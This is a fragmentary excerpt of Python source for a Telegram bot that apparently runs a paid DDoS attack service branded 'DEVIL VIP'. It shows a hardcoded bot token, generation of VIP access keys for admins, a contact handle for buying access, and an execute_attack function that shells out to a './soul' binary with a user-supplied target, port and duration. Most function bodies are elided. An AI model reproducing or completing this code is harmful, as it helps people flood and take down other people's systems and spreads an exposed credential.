...
# --- Configuration ---
bot = telebot.TeleBot('7740838092:AAEu0uSZq8Y6SrkfWj7no8egC81c0aiIHbU')
...
def generate_key(length=10):
    ...
    return f"𝗗𝗘𝗩𝗜𝗟-𝗩𝗜𝗣-{key.upper()}"  # Ensure key is in uppercase
...
def generate_key_command(message):
    ...
    if user_id in admin_id:
        ...
        response = "𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝗔𝗱𝗺𝗶𝗻 @DEVILVIPDDOS"
...
def execute_attack(user_id, target, port, time):
    ...
    try:
        ...
        full_command = f"./soul {target} {port} {time}"  # Replace with actual attack command
